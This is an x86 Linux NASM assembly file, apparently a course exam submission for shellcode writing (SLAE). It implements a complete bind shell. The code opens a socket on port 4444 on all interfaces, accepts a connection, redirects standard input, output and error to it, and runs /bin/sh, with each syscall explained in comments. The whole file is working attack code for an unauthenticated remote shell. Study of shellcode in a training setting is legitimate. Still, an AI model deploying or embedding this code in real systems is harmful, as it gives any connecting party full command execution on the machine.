; Filename: bind_shell.nasm
; Author:   Jakub Heba
; Purpose:  SLAE Course & Exam

global _start			

; Header Files:
; -------------------------------------------------------------------------------------------------------
; |  Linux Syscall description file path: 	        |  /usr/include/i386-linux-gnu/asm/unistd_32.h  |
; |  Linux Socketcall numbers:				|  /usr/include/linux/net.h		     	|
; |  Linux IP Protocols Declarations:		        |  /usr/include/netinet/in.h		      	|
; |  Linux System-specific socket constants and types:	|  /usr/include/i386-linux-gnu/bits/socket.h	|
; |  Values for setsockopt():				|  /usr/include/asm-generic/socket.h		|
; -------------------------------------------------------------------------------------------------------

section .text
_start:

cleaning:
	; cleaning all registers for further usage
	xor eax, eax
	xor ebx, ebx
 	xor ecx, ecx
	xor edx, edx

sys_socket:
	; {C code} --> int bind_socket = socket(AF_INET, SOCK_STREAM, 0);
	
  	; syscall definition
  	mov al, 102			; syscall - socketcall
	mov bl, 1			; socketcall type - sys_socket

	; pushing the sys_socket atributes in reverse order (AF_INET, SOCK_STREAM, IPPROTO_IP)
	xor esi, esi		
	push esi			; IPPROTO_IP = 0 (null)
	push 1				; SOCK_STREAM = 1
	push 2				; AF_INET = 2 (PF_INET)

	mov ecx, esp			; directing the stack pointer to sys_socket() function arguments

	int 128				; syscall execution
    
	mov edx, eax			; saving the bind_socket pointer for further usage

sys_setsocopt:
	; {C code} --> int option = 1;
    	; {C code} --> setsockopt(bind_socket, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option));
	
	; syscall definition
	mov al, 102			; syscall - socketcall
	mov bl, 14		        ; socketcall type - sys_setsocopt

	; pushing the sys_setsocopt arguments in reverse order (bind_socket, SOL_SOCKET, SO_REUSEADDR, &socklen_t, socklen_t)
	push 4			        ; socklen_t size 
	push esp		        ; pushing address of the socklen_t (from stack)
	push 2			        ; SO_REUSEADDR = 2
	push 1			        ; SOL_SOCKET = 1
	push edx		        ; bind_socket pointer

	mov ecx, esp			; directing the stack pointer to sys_setsocopt() function arguments

	int 128				; syscall execution

sys_bind:
	; {C code} --> struct sockaddr_in address;
    	; {C code} --> address.sin_addr.s_addr = INADDR_ANY;
    	; {C code} --> address.sin_port = htons(PORT);
    	; {C code} --> address.sin_family = AF_INET;
	; {C code} --> bind(bind_socket,(struct sockaddr *)&address, sizeof(address));

	; syscall definition
	mov al, 102		        ; syscall - socketcall
	mov bl, 2		        ; socketcall type - sys_bind
  
	; pushing the address struct arguments
	xor esi, esi
	push esi		        ; pushing INADDR_ANY = 0 (null)
	push word 0x5c11		; PORT = 4444 (change reverse hex value for different port)
	push word 2		        ; AF_INET = 2 (must be word, to hold the IP address)

	mov ecx, esp			; directing the stack pointer to address struct arguments
	
	; pushing the sys_bind arguments in reverse order (int bind_socket, const struct sockaddr *addr, socklen_t addrlen) 
	push 16		          	; socklen_t addrlen (size) = 16
	push ecx		        ; const struct sockaddr *addr - stack pointer with struct arguments	
	push edx		        ; bind_socket pointer

	mov ecx, esp			; directing the stack pointer to sys_bind() function arguments

	int 128			        ; syscall execution

sys_listen:
	; {C code} --> listen(bind_socket,0);
	
	; syscall definition
	mov al, 102		        ; syscall - socketcall
	mov bl, 4		        ; socketcall type - sys_listen

	; pushing the sys_listen arguments in reverse order (int bind_socket, int backlog)
	xor esi,esi		
	push esi		        ; pushing backlog = 0 (null)
	push edx		        ; bind_socket pointer
  
	mov ecx, esp			; directing the stack pointer to sys_listen() function arguments
	
	int 128			        ; syscall execution

sys_accept:
	; {C code} --> int sock = accept(bind_socket,NULL,NULL);
	
	; syscall definition
	mov al, 102		        ; syscall - socketcall
	mov bl, 5		        ; socketcall type - sys_accept
	
	; pushing the sys_accept arguments in reverse order (int bind_socket, struct sockaddr *addr, socklen_t *addrlen)
	xor esi, esi
	push esi		        ; pushing socklen_t *addrlen = 0 (null)
	push esi		        ; pushing struct sockaddr *addr = 0 (null)
	push edx		        ; bind_socket pointer

	mov ecx, esp			; directing the stack pointer to sys_accept() function arguments

	int 128			        ; syscall execution

	mov edx, eax			; saving the bind_socket pointer for further usage

sys_dup2:
	; {C code} --> dup2(sock,2);
    	; {C code} --> dup2(sock,1);
	; {C code} --> dup2(sock,0);

	; syscall definition
	mov al, 63			; syscall - dup2
	
	mov ebx, edx			; overwriting the bind_socket pointer
	xor ecx, ecx			; STDIN - 0 (null)

	int 128			        ; syscall execution

	; syscall definition
	mov al, 63		        ; syscall - dup2
	mov cl, 1		        ; STDOUT - 1
	
	int 128		          	; syscall execution

	; syscall definition
	mov al, 63        		; syscall - dup2
	mov cl, 2		        ; STDERR - 2

	int 128         		; syscall execution

sys_execve:
	; {C code} --> execve("/bin/sh",NULL,NULL);

	; syscall definition
	mov al, 11	        	; syscall - execve

	; pushing the sys_execve string argument
   	 xor esi, esi
	push esi	          	; pushing 0 (null)

	push 0x68732f6e	    		; pushing "n/sh"
	push 0x69622f2f		    	; pushing "//bi"

    	; pushing the sys_execve arguments (const char *filename, char *const argv[], char *const envp[])
	mov ebx, esp	      		; directing the stack pointer to sys_execve() string argument
	xor ecx, ecx	      		; char *const envp[] = 0 (null)
	xor edx, edx	      		; char *const argv[] = 0 (null)

	int 128	          		; syscall execution
